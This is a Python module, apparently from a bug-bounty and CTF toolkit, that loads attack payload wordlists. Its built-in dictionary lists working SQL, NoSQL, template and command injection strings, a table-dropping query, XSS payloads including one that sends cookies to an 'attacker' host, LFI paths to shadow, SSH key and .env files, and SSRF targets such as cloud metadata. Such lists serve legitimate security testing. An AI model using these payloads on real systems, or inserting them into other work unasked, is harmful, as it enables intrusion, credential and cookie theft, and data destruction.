"""Payload wordlists — load custom payloads from files instead of hardcoded dicts.

Supports loading wordlists from:
- Files on disk (one payload per line)
- The built-in reference/payload-library.md
- Common CTF wordlists (LFI paths, SQLi payloads, XSS payloads)

Usage:
    from bugbounty_ctf.wordlists import WordlistLoader

    loader = WordlistLoader()
    sqli = loader.load("sqli")
    lfi = loader.load("lfi")
    custom = loader.load_file("/path/to/wordlist.txt")
"""

from __future__ import annotations

from pathlib import Path

BUILTIN_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "'",
        "' OR 1=1--",
        "' OR '1'='1",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(3)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "'; DROP TABLE users--",
        "' OR SLEEP(3)--",
        '" OR "1"="1',
        "' OR 1=1#",
        "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
        "' UNION ALL SELECT NULL,NULL,concat(0x3a,version(),0x3a)--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "javascript:alert(1)",
        '"><script>alert(1)</script>',
        "<scr<script>ipt>alert(1)</script>",
        "<img src=x onerror=\"fetch('http://attacker/'+document.cookie)\">",
    ],
    "lfi": [
        "../../../etc/passwd",
        "../../../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/root/.ssh/id_rsa",
        "/var/log/auth.log",
        "/var/www/html/.env",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "file:///etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ],
    "ssti": [
        "{{7*7}}",
        "{{7*49}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{7*7}",
        "{{config}}",
        "{{self}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    "cmdi": [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "$(`cat /etc/passwd`)",
        "; ls -la /",
        "| ls -la /",
        "\nid",
        "\nid\n",
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost",
        "http://0177.0.0.1",
        "http://2130706433",
        "http://0x7f000001",
        "http://127.1",
        "http://0",
        "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",
        "http://2852039166/latest/meta-data/",
        "http://[::1]",
        "http://[::ffff:127.0.0.1]",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/_HELO%20test",
        "dict://localhost:11211/stats",
    ],
    "idor": [
        "1",
        "2",
        "0",
        "3",
        "42",
        "100",
        "999",
        "1000",
        "admin",
        "root",
        "user",
        "00000000-0000-0000-0000-000000000001",
    ],
    "nosqli": [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"$ne": ""}',
        '{"$gt": null}',
    ],
}


class WordlistLoader:
    """Load payload wordlists from files or built-in dictionaries."""

    def __init__(self, wordlists_dir: str | Path | None = None) -> None:
        self.wordlists_dir = Path(wordlists_dir) if wordlists_dir else None
        self._cache: dict[str, list[str]] = {}

    def load(self, vuln_type: str) -> list[str]:
        """Load a wordlist by vulnerability type.

        Tries file first (if wordlists_dir is set), then falls back to built-in.
        """
        if vuln_type in self._cache:
            return self._cache[vuln_type]

        if self.wordlists_dir:
            file_path = self.wordlists_dir / f"{vuln_type}.txt"
            if file_path.exists():
                payloads = self.load_file(str(file_path))
                self._cache[vuln_type] = payloads
                return payloads

        payloads = BUILTIN_PAYLOADS.get(vuln_type, [])
        self._cache[vuln_type] = payloads
        return payloads

    @staticmethod
    def load_file(path: str) -> list[str]:
        """Load a wordlist from a file (one payload per line)."""
        try:
            with open(path) as f:
                return [line.strip() for line in f if line.strip() and not line.startswith("#")]
        except OSError:
            return []

    def load_from_markdown(self, md_path: str, section: str | None = None) -> list[str]:
        """Extract payloads from a markdown file (like payload-library.md).

        Parses code blocks or list items as payloads.
        """
        try:
            with open(md_path) as f:
                content = f.read()
        except OSError:
            return []

        payloads: list[str] = []
        in_section = section is None
        in_code = False
        code_lines: list[str] = []

        for line in content.split("\n"):
            if section and line.strip().startswith("#"):
                if section.lower() in line.lower():
                    in_section = True
                elif in_section:
                    in_section = False

            if in_section:
                if line.strip().startswith("```"):
                    if in_code:
                        if code_lines:
                            payload = "\n".join(code_lines).strip()
                            if payload:
                                payloads.append(payload)
                        code_lines = []
                        in_code = False
                    else:
                        in_code = True
                elif in_code:
                    code_lines.append(line)
                elif line.strip().startswith("- ") or line.strip().startswith("* "):
                    payload = line.strip()[2:].strip()
                    if payload and not payload.startswith("#"):
                        payloads.append(payload)

        return payloads

    def get_payload_dict(self, vuln_type: str) -> dict[str, str]:
        """Get payloads as a dict (name → payload) for use with run_payload_set."""
        payloads = self.load(vuln_type)
        return {f"{vuln_type}_{i}": p for i, p in enumerate(payloads)}

    def list_types(self) -> list[str]:
        """List all available wordlist types."""
        return list(BUILTIN_PAYLOADS.keys())

    def merge(self, vuln_type: str, extra: list[str]) -> list[str]:
        """Merge built-in payloads with extra payloads."""
        base = self.load(vuln_type)
        merged = base + [p for p in extra if p not in base]
        self._cache[vuln_type] = merged
        return merged
